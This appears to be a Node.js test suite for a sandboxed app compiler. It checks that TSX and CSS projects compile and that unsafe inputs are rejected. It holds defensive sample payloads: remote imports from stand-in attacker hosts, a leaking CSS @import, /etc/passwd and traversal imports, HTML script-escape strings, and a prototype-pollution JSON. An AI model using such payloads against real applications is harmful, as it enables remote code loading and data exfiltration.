import test from 'node:test'
import assert from 'node:assert/strict'
import { Script, createContext } from 'node:vm'
import {
  compileAppProject,
  compileSourceFiles,
  DEFAULT_ALLOWED_PACKAGES,
  APP_COMPILER_LIMITS,
} from '../src/make/compiler.ts'
import { createAppProject } from '../src/make/manifest.ts'

test('compiles a working interactive fixture with TSX and CSS into preview assets', async () => {
  const project = createAppProject({
    name: 'Counter Demo',
    files: {
      'src/App.tsx': `
import React, { useState } from 'react'
import { CounterButton } from './components/CounterButton'
import './styles.css'

export default function App() {
  const [active, setActive] = useState(true)
  return (
    <main className="canvas-frame">
      <h1 className="title">Paper Counter</h1>
      {active && <CounterButton initialCount={5} />}
    </main>
  )
}
`,
      'src/components/CounterButton.tsx': `
import React, { useState } from 'react'

export interface CounterButtonProps {
  initialCount?: number
}

export function CounterButton({ initialCount = 0 }: CounterButtonProps) {
  const [count, setCount] = useState(initialCount)
  return (
    <button
      id="counter-btn"
      className="btn-primary"
      onClick={() => setCount(prev => prev + 1)}
    >
      Count: {count}
    </button>
  )
}
`,
      'src/styles.css': `
.canvas-frame {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  min-height: 100vh;
  background-color: #080808;
  color: #edebe1;
  font-family: sans-serif;
}
.title {
  font-size: 20px;
  font-weight: 600;
  margin-bottom: 16px;
}
.btn-primary {
  background-color: #81adec;
  color: #080808;
  border: 1px solid #222222;
  padding: 8px 16px;
  border-radius: 6px;
  cursor: pointer;
}
`,
    },
  })

  const result = await compileAppProject(project)

  assert.equal(result.success, true)
  assert.equal(result.diagnostics.length, 0)
  assert.ok(result.assets)
  assert.equal(result.assets.entryPoint, 'src/App.tsx')
  assert.ok(result.assets.js.includes('Paper Counter'))
  assert.ok(result.assets.js.includes('counter-btn'))
  assert.ok(result.assets.css.includes('background-color: #080808'))
  assert.ok(result.assets.html.includes('<div id="root"></div>'))
  assert.ok(result.assets.html.includes('background-color: #080808'))
  assert.ok(result.modules['src/App.tsx'])
  assert.ok(result.modules['src/components/CounterButton.tsx'])
  assert.ok(result.modules['src/styles.css'])
  assert.ok(result.stats.moduleCount >= 2)
})

test('denied package imports fail safely with line/column diagnostics', async () => {
  const cases = [
    { pkg: 'axios', importCode: "import axios from 'axios'" },
    { pkg: 'lodash', importCode: "import { debounce } from 'lodash'" },
    { pkg: 'node:fs', importCode: "import fs from 'node:fs'" },
    { pkg: 'child_process', importCode: "import { exec } from 'child_process'" },
    { pkg: 'react-router', importCode: "import { useNavigate } from 'react-router'" },
    { pkg: 'arbitrary-pkg', importCode: "export * from 'arbitrary-pkg'" },
  ]

  for (const { pkg, importCode } of cases) {
    const result = await compileSourceFiles({
      'src/App.tsx': `
import React from 'react'
${importCode}

export default function App() {
  return <div>Test</div>
}
`,
    })

    assert.equal(result.success, false, `Expected compile failure for denied import "${pkg}"`)
    assert.equal(result.assets, null)
    assert.ok(result.diagnostics.length > 0)
    const deniedDiag = result.diagnostics.find(d => d.code === 'DENIED_IMPORT')
    assert.ok(deniedDiag, `Missing DENIED_IMPORT diagnostic for ${pkg}`)
    assert.equal(deniedDiag.file, 'src/App.tsx')
    assert.equal(deniedDiag.line, 3)
    assert.ok(typeof deniedDiag.column === 'number' && deniedDiag.column > 0)
    assert.equal(deniedDiag.severity, 'error')
    assert.ok(deniedDiag.message.includes(pkg))
  }
})

test('allowlisted packages are accepted without errors', async () => {
  for (const pkg of DEFAULT_ALLOWED_PACKAGES) {
    const importStmt = pkg.includes('shaders')
      ? `import * as Shaders from '${pkg}'`
      : pkg.includes('lucide')
        ? `import { Heart } from '${pkg}'`
        : `import '${pkg}'`

    const result = await compileSourceFiles({
      'src/App.tsx': `
import React from 'react'
${importStmt}

export default function App() {
  return <div>Allowed: ${pkg}</div>
}
`,
    })

    assert.equal(result.success, true, `Expected allowed package "${pkg}" to compile successfully`)
    assert.equal(result.diagnostics.length, 0)
    assert.ok(result.assets)
  }
})

test('dynamic imports fail safely with line and column diagnostics', async () => {
  const dynamicCases = [
    { code: "const m = import('./lazy')", line: 5 },
    { code: "const m = import('http://evil.com/payload.js')", line: 5 },
    { code: "async function load(f) { return await import(f) }", line: 5 },
  ]

  for (const { code, line } of dynamicCases) {
    const result = await compileSourceFiles({
      'src/App.tsx': `
import React from 'react'

export default function App() {
  ${code}
  return <div>Dynamic Test</div>
}
`,
    })

    assert.equal(result.success, false, `Expected dynamic import to be rejected: ${code}`)
    assert.equal(result.assets, null)
    const diag = result.diagnostics.find(d => d.code === 'DYNAMIC_IMPORT_FORBIDDEN')
    assert.ok(diag, 'Expected DYNAMIC_IMPORT_FORBIDDEN diagnostic')
    assert.equal(diag.file, 'src/App.tsx')
    assert.equal(diag.line, line)
    assert.equal(diag.severity, 'error')
  }
})

test('forbidden dynamic execution (eval, Function constructor, require) fails safely', async () => {
  const forbiddenCases = [
    { code: 'eval("window.x = 1")', messageSubstring: 'eval' },
    { code: 'const f = new Function("return 1")', messageSubstring: 'Function' },
    { code: 'const r = require("react")', messageSubstring: 'require' },
  ]

  for (const { code, messageSubstring } of forbiddenCases) {
    const result = await compileSourceFiles({
      'src/App.tsx': `
import React from 'react'

export default function App() {
  ${code}
  return <div>Forbidden Call</div>
}
`,
    })

    assert.equal(result.success, false, `Expected forbidden call to be rejected: ${code}`)
    assert.equal(result.assets, null)
    const diag = result.diagnostics.find(d => d.code === 'FORBIDDEN_CALL')
    assert.ok(diag, `Expected FORBIDDEN_CALL diagnostic for: ${code}`)
    assert.ok(diag.message.toLowerCase().includes(messageSubstring.toLowerCase()))
  }
})

test('oversized files and oversized total sources fail safely before compilation', async () => {
  const hugeContent = 'console.log("x");\n' + ' '.repeat(APP_COMPILER_LIMITS.MAX_FILE_BYTES + 10)
  const resultSingle = await compileSourceFiles({
    'src/App.tsx': `export default () => <div>Ok</div>`,
    'src/huge.ts': hugeContent,
  })

  assert.equal(resultSingle.success, false)
  assert.equal(resultSingle.assets, null)
  const singleDiag = resultSingle.diagnostics.find(d => d.code === 'OVERSIZED_SOURCE')
  assert.ok(singleDiag)
  assert.equal(singleDiag.file, 'src/huge.ts')

  // Total source bytes exceeded
  const mediumChunk = ' '.repeat(300 * 1024)
  const manyFiles = {
    'src/App.tsx': `export default () => <div>Ok</div>`,
  }
  for (let i = 0; i < 8; i++) {
    manyFiles[`src/chunk_${i}.ts`] = `// chunk ${i}\n${mediumChunk}`
  }
  const resultTotal = await compileSourceFiles(manyFiles)
  assert.equal(resultTotal.success, false)
  const totalDiag = resultTotal.diagnostics.find(d => d.code === 'OVERSIZED_SOURCE')
  assert.ok(totalDiag)
})

test('invalid TSX syntax returns file, line, and column diagnostics', async () => {
  const brokenCode = `
import React from 'react'

export default function App() {
  return (
    <div>
      <span>Unclosed tag
    </div>
  )
}
`
  const result = await compileSourceFiles({
    'src/App.tsx': brokenCode,
  })

  assert.equal(result.success, false)
  assert.equal(result.assets, null)
  const syntaxDiag = result.diagnostics.find(d => d.code === 'SYNTAX_ERROR')
  assert.ok(syntaxDiag, 'Expected SYNTAX_ERROR diagnostic')
  assert.equal(syntaxDiag.file, 'src/App.tsx')
  assert.ok(typeof syntaxDiag.line === 'number' && syntaxDiag.line > 0)
  assert.ok(typeof syntaxDiag.column === 'number' && syntaxDiag.column > 0)
  assert.equal(syntaxDiag.severity, 'error')
})

test('missing entry point fails safely with diagnostic', async () => {
  const result = await compileSourceFiles(
    {
      'src/Other.tsx': `export default () => <div>Hello</div>`,
    },
    { entryPoint: 'src/App.tsx' }
  )

  assert.equal(result.success, false)
  assert.equal(result.assets, null)
  const diag = result.diagnostics.find(d => d.code === 'MISSING_ENTRY_POINT')
  assert.ok(diag)
  assert.equal(diag.file, 'src/App.tsx')
})

test('unresolvable local import fails safely with MODULE_NOT_FOUND', async () => {
  const result = await compileSourceFiles({
    'src/App.tsx': `
import React from 'react'
import { MissingWidget } from './components/MissingWidget'

export default function App() {
  return <div><MissingWidget /></div>
}
`,
  })

  assert.equal(result.success, false)
  assert.equal(result.assets, null)
  const diag = result.diagnostics.find(d => d.code === 'MODULE_NOT_FOUND')
  assert.ok(diag)
  assert.equal(diag.file, 'src/App.tsx')
  assert.equal(diag.line, 3)
  assert.ok(diag.message.includes('./components/MissingWidget'))
})

test('malicious CSS with external @import fails safely', async () => {
  const result = await compileSourceFiles({
    'src/App.tsx': `
import React from 'react'
import './styles.css'
export default () => <div>styled</div>
`,
    'src/styles.css': `
@import url('https://attacker.site/leak.css');
body { color: red; }
`,
  })

  assert.equal(result.success, false)
  assert.equal(result.assets, null)
  const diag = result.diagnostics.find(d => d.code === 'FORBIDDEN_CSS_IMPORT')
  assert.ok(diag)
  assert.equal(diag.file, 'src/styles.css')
})

test('circular relative imports compile and resolve safely without hanging', async () => {
  const result = await compileSourceFiles({
    'src/App.tsx': `
import React from 'react'
import { getA } from './moduleA'

export default function App() {
  return <div>{getA()}</div>
}
`,
    'src/moduleA.ts': `
import { getB } from './moduleB'
export function getA() { return 'A' + getB() }
`,
    'src/moduleB.ts': `
import { getA } from './moduleA'
export function getB() { return 'B' }
`,
  })

  assert.equal(result.success, true)
  assert.ok(result.assets)
  assert.equal(result.diagnostics.length, 0)
  assert.ok(result.assets.js.includes('moduleA'))
  assert.ok(result.assets.js.includes('moduleB'))
})

test('JSON files can be imported statically and bundled safely', async () => {
  const result = await compileSourceFiles({
    'src/App.tsx': `
import React from 'react'
import config from './config.json'

export default function App() {
  return <div>App name: {config.name}</div>
}
`,
    'src/config.json': `{"name": "Paper Studio", "version": 1}`,
  })

  assert.equal(result.success, true)
  assert.ok(result.assets)
  assert.equal(result.diagnostics.length, 0)
  assert.ok(result.assets.js.includes('Paper Studio'))
})

test('static policy rejects subpaths, import-equals and JSX runtime overrides', async () => {
  for (const source of [
    "import 'react/not-approved'; export default () => <div />",
    "import fs = require('node:fs'); export default () => <div />",
    "/** @jsxImportSource https://evil.test */ export default () => <div />",
  ]) {
    const result = await compileSourceFiles({ 'src/App.tsx': source })
    assert.equal(result.success, false, source)
    assert.equal(result.assets, null)
    assert.deepEqual(result.modules, {})
    assert.ok(result.diagnostics.some(d => d.line > 0 && d.column > 0))
  }
})

test('input errors and parser exhaustion return diagnostics instead of throwing', async () => {
  for (const files of [
    null,
    { 'src/App.tsx': null },
    { 'src/App.tsx': 42 },
    [{ path: 'src/App.tsx', content: 'export default () => <div />' }, { path: './src/App.tsx', content: 'export default 0' }],
    { 'src/App.tsx': '('.repeat(20000) },
  ]) {
    const result = await compileSourceFiles(files)
    assert.equal(result.success, false)
    assert.equal(result.assets, null)
    assert.ok(result.diagnostics.length)
  }
})

test('compiler options cannot widen the package policy or input budgets', async () => {
  for (const options of [
    { allowlist: ['node:fs'] },
    { maxFileBytes: Infinity },
    { maxFileBytes: -1 },
    { maxTotalBytes: APP_COMPILER_LIMITS.MAX_TOTAL_FILES_BYTES + 1 },
  ]) {
    const result = await compileSourceFiles({ 'src/App.tsx': 'export default () => <div />' }, options)
    assert.equal(result.success, false)
    assert.equal(result.assets, null)
  }
})

test('build ignores generated package scripts, configuration and HTML', async () => {
  const files = {
    'src/App.tsx': 'export default () => <button>Static only</button>',
    'package.json': '{"scripts":{"build":"touch /tmp/paper-make-must-not-execute"},"dependencies":{"evil":"*"}}',
    'vite.config.ts': 'throw new Error("untrusted config executed")',
    'index.html': '<script>throw new Error("untrusted HTML executed")</script>',
    'README.md': '# Not a source module',
  }
  const before = JSON.stringify(files)
  const result = await compileSourceFiles(files)
  assert.equal(result.success, true, JSON.stringify(result.diagnostics))
  assert.equal(JSON.stringify(files), before)
  assert.ok(!result.assets.html.includes('untrusted HTML'))
  assert.ok(!result.assets.js.includes('untrusted config'))
})

test('CSS parsing handles quoted braces and rejects escaped imports and invalid declarations', async () => {
  const app = "import './styles.css'; export default () => <div/>"
  const valid = await compileSourceFiles({ 'src/App.tsx': app, 'src/styles.css': 'div::before { content: "}"; }' })
  assert.equal(valid.success, true, JSON.stringify(valid.diagnostics))
  for (const css of ['@IMPORT "https://evil.test/x.css";', '@\\69mport "https://evil.test/x.css";', 'div { color red; }']) {
    const result = await compileSourceFiles({ 'src/App.tsx': app, 'src/styles.css': css })
    assert.equal(result.success, false, css)
    assert.equal(result.assets, null)
    assert.ok(result.diagnostics.some(d => d.file === 'src/styles.css' && d.line > 0))
  }
})

test('HTML assets cannot be escaped by source strings or CSS content', async () => {
  const result = await compileSourceFiles({
    'src/App.tsx': `import './style.css'; export default () => <p>{String.raw\`</ScRiPt><script>globalThis.injected=1</script><!--\`}</p>`,
    'src/style.css': 'p::before { content: "</style><script>globalThis.injected=2</script>"; }',
  })
  assert.equal(result.success, true)
  assert.ok(!result.assets.html.includes('globalThis.injected'))
  const encoded = result.assets.html.match(/src="data:text\/javascript;base64,([^"]+)"/)
  assert.ok(encoded, 'compiled JS is carried as data, never interpolated into HTML markup')
  assert.equal(Buffer.from(encoded[1], 'base64').toString('utf8'), result.assets.js)
})

test('compilation leaves generated module effects and source accessors unexecuted', async () => {
  let reads = 0
  const sourceWithGetter = Object.defineProperty({}, 'src/App.tsx', { enumerable: true, get() { reads++; return 'export default 1' } })
  const invalid = await compileSourceFiles(sourceWithGetter)
  assert.equal(invalid.success, false)
  assert.equal(reads, 0)
  const valid = await compileSourceFiles({ 'src/App.tsx': 'globalThis.__paperGeneratedExecuted = true; throw new Error("Must not execute"); export default () => <div />' })
  assert.equal(valid.success, true)
  assert.equal(globalThis.__paperGeneratedExecuted, undefined)
})

test('relative resolution supports re-exports and never edits source strings', async () => {
  const result = await compileSourceFiles({
    'src/App.tsx': `import { value } from './dir'; export default () => <p>{value}</p>`,
    'src/dir/index.ts': `export { value } from '../data'`,
    'src/data.ts': `export const value = 'require("./dir")'`,
    'src/unused.css': 'body { background: red }',
  })
  assert.equal(result.success, true)
  assert.ok(result.modules['src/data.ts'].code.includes('require("./dir")'))
  assert.ok(result.modules['src/dir/index.ts'].code.includes('src/data.ts'))
  assert.equal(result.assets.css, '')
  for (const specifier of ['../../../outside', '/etc/passwd', 'https://evil.test/a.js', './dir?raw', './package.json']) {
    const invalid = await compileSourceFiles({ 'src/App.tsx': `import '${specifier}'; export default () => <div />` })
    assert.equal(invalid.success, false, specifier)
    assert.equal(invalid.assets, null)
  }
})

test('UTF-8 byte budgets and file counts are enforced before parsing', async () => {
  const utf8 = await compileSourceFiles({ 'src/App.tsx': '// ' + 'é'.repeat(20) }, { maxFileBytes: 30 })
  assert.equal(utf8.success, false)
  assert.ok(utf8.diagnostics.some(d => d.code === 'OVERSIZED_SOURCE'))
  const tooMany = Object.fromEntries(Array.from({ length: APP_COMPILER_LIMITS.MAX_FILES_COUNT + 1 }, (_, i) => [`src/file${i}.ts`, 'export {}']))
  const count = await compileSourceFiles(tooMany)
  assert.equal(count.success, false)
  assert.equal(count.diagnostics[0].code, 'OVERSIZED_SOURCE')
})


// Execute only this test-authored fixture in a separate realm to verify the emitted
// loader and installed React. The production compiler never executes user modules.
test('emitted runtime resolves JSON, re-exports, cycles and JSX with real React', async () => {
  const result = await compileSourceFiles({
    'src/App.tsx': `import { text } from './dir'; import config from './config.json'; export default () => <p>{text + config.value}</p>`,
    'src/dir/index.ts': `export { text } from '../text'`,
    'src/text.ts': `import { suffix } from './cycle'; export const text = 'require("./dir")' + suffix`,
    'src/cycle.ts': `import './text'; export const suffix = ':'`,
    'src/config.json': '{"value":"Paper","__proto__":{"polluted":true}}',
  })
  assert.equal(result.success, true, JSON.stringify(result.diagnostics))
  const realm = createContext({})
  new Script(result.assets.js).runInContext(realm, { timeout: 2000 })
  assert.equal(realm.__paperApp.ready, true)
  const element = realm.__paperApp.require('src/App.tsx').default()
  assert.equal(element.type, 'p')
  assert.equal(element.props.children, 'require("./dir"):Paper')
  assert.equal(typeof realm.__paperApp.require('react').useState, 'function')
  assert.equal(typeof realm.__paperApp.require('react-dom/client').createRoot, 'function')
  assert.equal(typeof realm.__paperApp.require('@paper-design/shaders-react').MeshGradient, 'object')
  assert.equal(typeof realm.__paperApp.require('lucide-react').Plus, 'object')
  const config = realm.__paperApp.require('src/config.json')
  assert.equal(Object.hasOwn(config, '__proto__'), true)
  assert.equal(config.polluted, undefined)
  assert.throws(() => realm.__paperApp.require('node:fs'), /Module not found/)
})
